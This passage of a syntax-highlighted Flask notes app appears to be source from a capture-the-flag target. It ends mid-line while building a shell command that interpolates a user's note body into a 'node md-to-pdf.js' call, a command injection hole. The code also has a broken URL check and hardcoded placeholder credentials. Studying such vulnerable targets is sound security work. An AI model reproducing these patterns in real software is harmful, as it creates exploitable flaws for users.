  <span class="kn">from</span> <span class="n">passlib.hash</span> <span class="kn">import</span> <span class="n">sha256_crypt</span>
  <span class="kn">from</span> <span class="n">functools</span> <span class="kn">import</span> <span class="n">wraps</span>
  <span class="kn">import</span> <span class="n">time</span>
  <span class="kn">import</span> <span class="n">requests</span> <span class="k">as</span> <span class="n">pyrequest</span>
  <span class="kn">from</span> <span class="n">html2text</span> <span class="kn">import</span> <span class="n">html2text</span>
  <span class="kn">import</span> <span class="n">markdown</span>
  <span class="kn">import</span> <span class="n">random</span><span class="p">,</span> <span class="n">os</span><span class="p">,</span> <span class="n">subprocess</span>
    
  <span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
    
  <span class="c1">## Config MySQL
</span>  <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">MYSQL_HOST</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">localhost</span><span class="sh">'</span>
  <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">MYSQL_USER</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">DB_user</span><span class="sh">'</span>
  <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">MYSQL_PASSWORD</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">DB_password</span><span class="sh">'</span>
  <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">MYSQL_DB</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">app</span><span class="sh">'</span>
  <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">MYSQL_CURSORCLASS</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">DictCursor</span><span class="sh">'</span>
    
  <span class="n">attachment_dir</span> <span class="o">=</span> <span class="sh">'</span><span class="s">misc/attachments/</span><span class="sh">'</span>
    
  <span class="c1">## init MYSQL
</span>  <span class="n">mysql</span> <span class="o">=</span> <span class="nc">MySQL</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
    
  <span class="c1">## Index
</span>  <span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>
  <span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
      <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">home.html</span><span class="sh">'</span><span class="p">)</span>
    
  <span class="c1">## About
</span>  <span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/about</span><span class="sh">'</span><span class="p">)</span>
  <span class="k">def</span> <span class="nf">about</span><span class="p">():</span>
      <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">about.html</span><span class="sh">'</span><span class="p">)</span>
    
  <span class="c1">## Check if user logged in
</span>  <span class="k">def</span> <span class="nf">is_logged_in</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
      <span class="nd">@wraps</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
      <span class="k">def</span> <span class="nf">wrap</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
          <span class="k">if</span> <span class="sh">'</span><span class="s">logged_in</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
              <span class="k">return</span> <span class="nf">f</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
          <span class="k">else</span><span class="p">:</span>
              <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Unauthorized, Please login</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">danger</span><span class="sh">'</span><span class="p">)</span>
              <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">login</span><span class="sh">'</span><span class="p">))</span>
      <span class="k">return</span> <span class="n">wrap</span>
    
  <span class="c1">## notes
</span>  <span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/notes</span><span class="sh">'</span><span class="p">)</span>
  <span class="nd">@is_logged_in</span>
  <span class="k">def</span> <span class="nf">notes</span><span class="p">():</span>
      <span class="c1">## Create cursor
</span>      <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
      <span class="c1">## Get notes
</span>      <span class="k">if</span> <span class="nf">check_VIP</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]):</span>
          <span class="n">result</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT * FROM notes where author= (%s or </span><span class="sh">'</span><span class="s">Noter Team</span><span class="sh">'</span><span class="s">)</span><span class="sh">"</span><span class="p">,[</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]])</span>
      <span class="k">else</span><span class="p">:</span>
          <span class="n">result</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT * FROM notes where author= %s</span><span class="sh">"</span><span class="p">,[</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]])</span>
    
      <span class="n">notes</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">fetchall</span><span class="p">()</span>
    
      <span class="k">if</span> <span class="n">result</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
          <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">notes.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">notes</span><span class="o">=</span><span class="n">notes</span><span class="p">)</span>
      <span class="k">else</span><span class="p">:</span>
          <span class="n">msg</span> <span class="o">=</span> <span class="sh">'</span><span class="s">No notes Found</span><span class="sh">'</span>
          <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">notes.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="n">msg</span><span class="p">)</span>
      <span class="c1">## Close connection
</span>      <span class="n">cur</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    
  <span class="c1">#Single note
</span>  <span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/note/&lt;string:id&gt;/</span><span class="sh">'</span><span class="p">)</span>
  <span class="nd">@is_logged_in</span>
  <span class="k">def</span> <span class="nf">note</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
      <span class="c1">## Create cursor
</span>      <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
    
      <span class="c1">## Get notes
</span>      <span class="k">if</span> <span class="nf">check_VIP</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]):</span>
          <span class="n">result</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT * FROM notes where author= (%s or </span><span class="sh">'</span><span class="s">Noter Team</span><span class="sh">'</span><span class="s">) and id = %s</span><span class="sh">"</span><span class="p">,(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">],</span> <span class="nb">id</span><span class="p">))</span>
      <span class="k">else</span><span class="p">:</span>
          <span class="n">result</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT * FROM notes where author= %s</span><span class="sh">"</span><span class="p">,[</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]])</span>
    
      <span class="n">note</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">fetchone</span><span class="p">()</span>
      <span class="n">note</span><span class="p">[</span><span class="sh">'</span><span class="s">body</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">html2text</span><span class="p">(</span><span class="n">note</span><span class="p">[</span><span class="sh">'</span><span class="s">body</span><span class="sh">'</span><span class="p">])</span>
      <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">note.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">note</span><span class="o">=</span><span class="n">note</span><span class="p">)</span>
    
  <span class="c1">## Register Form Class
</span>  <span class="k">class</span> <span class="nc">RegisterForm</span><span class="p">(</span><span class="n">Form</span><span class="p">):</span>
      <span class="n">name</span> <span class="o">=</span> <span class="nc">StringField</span><span class="p">(</span><span class="sh">'</span><span class="s">Name</span><span class="sh">'</span><span class="p">,</span> <span class="p">[</span><span class="n">validators</span><span class="p">.</span><span class="nc">Length</span><span class="p">(</span><span class="nb">min</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="nb">max</span><span class="o">=</span><span class="mi">50</span><span class="p">)])</span>
      <span class="n">username</span> <span class="o">=</span> <span class="nc">StringField</span><span class="p">(</span><span class="sh">'</span><span class="s">Username</span><span class="sh">'</span><span class="p">,</span> <span class="p">[</span><span class="n">validators</span><span class="p">.</span><span class="nc">Length</span><span class="p">(</span><span class="nb">min</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span> <span class="nb">max</span><span class="o">=</span><span class="mi">25</span><span class="p">)])</span>
      <span class="n">email</span> <span class="o">=</span> <span class="nc">StringField</span><span class="p">(</span><span class="sh">'</span><span class="s">Email</span><span class="sh">'</span><span class="p">,</span> <span class="p">[</span><span class="n">validators</span><span class="p">.</span><span class="nc">Length</span><span class="p">(</span><span class="nb">min</span><span class="o">=</span><span class="mi">6</span><span class="p">,</span> <span class="nb">max</span><span class="o">=</span><span class="mi">50</span><span class="p">)])</span>
      <span class="n">password</span> <span class="o">=</span> <span class="nc">PasswordField</span><span class="p">(</span><span class="sh">'</span><span class="s">Password</span><span class="sh">'</span><span class="p">,</span> <span class="p">[</span>
          <span class="n">validators</span><span class="p">.</span><span class="nc">DataRequired</span><span class="p">(),</span>
          <span class="n">validators</span><span class="p">.</span><span class="nc">EqualTo</span><span class="p">(</span><span class="sh">'</span><span class="s">confirm</span><span class="sh">'</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="sh">'</span><span class="s">Passwords do not match</span><span class="sh">'</span><span class="p">)</span>
      <span class="p">])</span>
      <span class="n">confirm</span> <span class="o">=</span> <span class="nc">PasswordField</span><span class="p">(</span><span class="sh">'</span><span class="s">Confirm Password</span><span class="sh">'</span><span class="p">)</span>
    
  <span class="c1">## User Register
</span>  <span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/register</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
  <span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
      <span class="n">form</span> <span class="o">=</span> <span class="nc">RegisterForm</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">)</span>
      <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span> <span class="ow">and</span> <span class="n">form</span><span class="p">.</span><span class="nf">validate</span><span class="p">():</span>
          <span class="n">name</span> <span class="o">=</span> <span class="n">form</span><span class="p">.</span><span class="n">name</span><span class="p">.</span><span class="n">data</span>
          <span class="n">email</span> <span class="o">=</span> <span class="n">form</span><span class="p">.</span><span class="n">email</span><span class="p">.</span><span class="n">data</span>
          <span class="n">username</span> <span class="o">=</span> <span class="n">form</span><span class="p">.</span><span class="n">username</span><span class="p">.</span><span class="n">data</span>
          <span class="n">password</span> <span class="o">=</span> <span class="n">sha256_crypt</span><span class="p">.</span><span class="nf">encrypt</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">form</span><span class="p">.</span><span class="n">password</span><span class="p">.</span><span class="n">data</span><span class="p">))</span>
    
          <span class="c1">## Create cursor
</span>          <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
    
          <span class="c1">## Execute query
</span>          <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">INSERT INTO users(name, email, username, password) VALUES(%s, %s, %s, %s)</span><span class="sh">"</span><span class="p">,</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">email</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">))</span>
    
          <span class="c1">## Commit to DB
</span>          <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
    
          <span class="c1">## Close connection
</span>          <span class="n">cur</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    
          <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">You are now registered and can log in</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">success</span><span class="sh">'</span><span class="p">)</span>
    
          <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">login</span><span class="sh">'</span><span class="p">))</span>
      <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">register.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">form</span><span class="o">=</span><span class="n">form</span><span class="p">)</span>
    
  <span class="c1">## User login
</span>  <span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/login</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
  <span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
      <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">:</span>
          <span class="c1">## Get Form Fields
</span>          <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span>
          <span class="n">password_candidate</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">]</span>
    
          <span class="c1">## Create cursor
</span>          <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
    
          <span class="c1">## Get user by username
</span>          <span class="n">result</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT * FROM users WHERE username = %s</span><span class="sh">"</span><span class="p">,</span> <span class="p">([</span><span class="n">username</span><span class="p">]))</span>
    
          <span class="k">if</span> <span class="n">result</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
              <span class="c1">## Get stored hash
</span>              <span class="n">data</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">fetchone</span><span class="p">()</span>
              <span class="n">password</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">]</span>
    
              <span class="c1">## Compare Passwords
</span>              <span class="k">if</span> <span class="n">sha256_crypt</span><span class="p">.</span><span class="nf">verify</span><span class="p">(</span><span class="n">password_candidate</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
                  <span class="c1">## Passed
</span>                  <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">logged_in</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="bp">True</span>
                  <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
    
                  <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">You are now logged in</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">success</span><span class="sh">'</span><span class="p">)</span>
                  <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">dashboard</span><span class="sh">'</span><span class="p">))</span>
              <span class="k">else</span><span class="p">:</span>
                  <span class="n">error</span> <span class="o">=</span> <span class="sh">'</span><span class="s">Invalid login</span><span class="sh">'</span>
                  <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">login.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">)</span>
              <span class="c1">## Close connection
</span>              <span class="n">cur</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
          <span class="k">else</span><span class="p">:</span>
              <span class="n">error</span> <span class="o">=</span> <span class="sh">'</span><span class="s">Invalid credentials</span><span class="sh">'</span>
              <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">login.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">)</span>
    
      <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">login.html</span><span class="sh">'</span><span class="p">)</span>
    
  <span class="c1">## Logout
</span>  <span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/logout</span><span class="sh">'</span><span class="p">)</span>
  <span class="nd">@is_logged_in</span>
  <span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
      <span class="n">session</span><span class="p">.</span><span class="nf">clear</span><span class="p">()</span>
      <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">You are now logged out</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">success</span><span class="sh">'</span><span class="p">)</span>
      <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">login</span><span class="sh">'</span><span class="p">))</span>
    
  <span class="c1">#Check VIP
</span>  <span class="k">def</span> <span class="nf">check_VIP</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
      <span class="k">try</span><span class="p">:</span>
          <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
          <span class="n">results</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"""</span><span class="s"> select username, case when role = </span><span class="sh">"</span><span class="s">VIP</span><span class="sh">"</span><span class="s"> then True else False end as VIP from users where username = %s </span><span class="sh">"""</span><span class="p">,</span> <span class="p">[</span><span class="n">username</span><span class="p">])</span>
    
          <span class="n">results</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">fetchone</span><span class="p">()</span>
          <span class="n">cur</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    
          <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">results</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
              <span class="k">if</span> <span class="n">results</span><span class="p">[</span><span class="sh">'</span><span class="s">VIP</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
                  <span class="k">return</span> <span class="bp">True</span>
    
          <span class="k">return</span> <span class="bp">False</span>
    
      <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
          <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">login.html</span><span class="sh">'</span><span class="p">)</span>
    
  <span class="c1">## Dashboard
</span>  <span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/dashboard</span><span class="sh">'</span><span class="p">)</span>
  <span class="nd">@is_logged_in</span>
  <span class="k">def</span> <span class="nf">dashboard</span><span class="p">():</span>
    
      <span class="c1">## Create cursor
</span>      <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
    
      <span class="c1">## Get notes
</span>      <span class="c1">#result = cur.execute("SELECT * FROM notes")
</span>      <span class="c1">## Show notes only from the user logged in 
</span>      <span class="n">result</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT * FROM notes WHERE author = %s</span><span class="sh">"</span><span class="p">,[</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]])</span>
    
      <span class="n">notes</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">fetchall</span><span class="p">()</span>
      <span class="n">VIP</span> <span class="o">=</span> <span class="nf">check_VIP</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">])</span>
    
      <span class="k">if</span> <span class="n">result</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
          <span class="k">if</span> <span class="n">VIP</span><span class="p">:</span>
              <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">vip_dashboard.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">notes</span><span class="o">=</span><span class="n">notes</span><span class="p">)</span>
    
          <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">dashboard.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">notes</span><span class="o">=</span><span class="n">notes</span><span class="p">)</span>
        
      <span class="k">else</span><span class="p">:</span>
          <span class="n">msg</span> <span class="o">=</span> <span class="sh">'</span><span class="s">No notes Found</span><span class="sh">'</span>
    
          <span class="k">if</span> <span class="n">VIP</span><span class="p">:</span>
              <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">vip_dashboard.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="n">msg</span><span class="p">)</span>
    
          <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">dashboard.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="n">msg</span><span class="p">)</span>
      <span class="c1">## Close connection
</span>      <span class="n">cur</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    
  <span class="c1">## parse the URL
</span>  <span class="k">def</span> <span class="nf">parse_url</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
      <span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="p">.</span><span class="nf">lower</span><span class="p">()</span>
      <span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="p">.</span><span class="nf">startswith </span><span class="p">(</span><span class="sh">"</span><span class="s">http://</span><span class="sh">"</span> <span class="ow">or</span> <span class="sh">"</span><span class="s">https://</span><span class="sh">"</span><span class="p">):</span>
          <span class="k">return</span> <span class="bp">False</span><span class="p">,</span> <span class="sh">"</span><span class="s">Invalid URL</span><span class="sh">"</span>    
    
      <span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="p">.</span><span class="nf">endswith</span><span class="p">(</span><span class="sh">'</span><span class="s">.md</span><span class="sh">'</span><span class="p">):</span>
              <span class="k">return</span> <span class="bp">False</span><span class="p">,</span> <span class="sh">"</span><span class="s">Invalid file type</span><span class="sh">"</span>
    
      <span class="k">return</span> <span class="bp">True</span><span class="p">,</span> <span class="bp">None</span>
    
  <span class="c1">## Export notes
</span>  <span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/export_note</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
  <span class="nd">@is_logged_in</span>
  <span class="k">def</span> <span class="nf">export_note</span><span class="p">():</span>
      <span class="k">if</span> <span class="nf">check_VIP</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]):</span>
          <span class="k">try</span><span class="p">:</span>
              <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
    
              <span class="c1">## Get note
</span>              <span class="n">result</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT * FROM notes WHERE author = %s</span><span class="sh">"</span><span class="p">,</span> <span class="p">([</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]]))</span>
    
              <span class="n">notes</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">fetchall</span><span class="p">()</span>
    
              <span class="k">if</span> <span class="n">result</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
                  <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">export_note.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">notes</span><span class="o">=</span><span class="n">notes</span><span class="p">)</span>
              <span class="k">else</span><span class="p">:</span>
                  <span class="n">msg</span> <span class="o">=</span> <span class="sh">'</span><span class="s">No notes Found</span><span class="sh">'</span>
                  <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">export_note.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="n">msg</span><span class="p">)</span>
              <span class="c1">## Close connection
</span>              <span class="n">cur</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
                    
          <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
              <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">export_note.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="sh">"</span><span class="s">An error occured!</span><span class="sh">"</span><span class="p">)</span>
    
      <span class="k">else</span><span class="p">:</span>
          <span class="nf">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">)</span>
    
  <span class="c1">## Export local
</span>  <span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/export_note_local/&lt;string:id&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">])</span>
  <span class="nd">@is_logged_in</span>
  <span class="k">def</span> <span class="nf">export_note_local</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
      <span class="k">if</span> <span class="nf">check_VIP</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]):</span>
    
          <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
    
          <span class="n">result</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT * FROM notes WHERE id = %s and author = %s</span><span class="sh">"</span><span class="p">,</span> <span class="p">(</span><span class="nb">id</span><span class="p">,</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]))</span>
    
          <span class="k">if</span> <span class="n">result</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
              <span class="n">note</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">fetchone</span><span class="p">()</span>
    
              <span class="n">rand_int</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="nf">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span>
              <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">node misc/md-to-pdf.js  $</span><span class="sh">'</span><span class="si">{</span><span class="n">note</span><span class="p">[</span><span class="sh">'</span><span class="s">body</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="sh">'</span><span class="s"> </span><span class="si">{</span><span class="n">rand_int</span><span class="si">}</span><span class="sh">"</span>
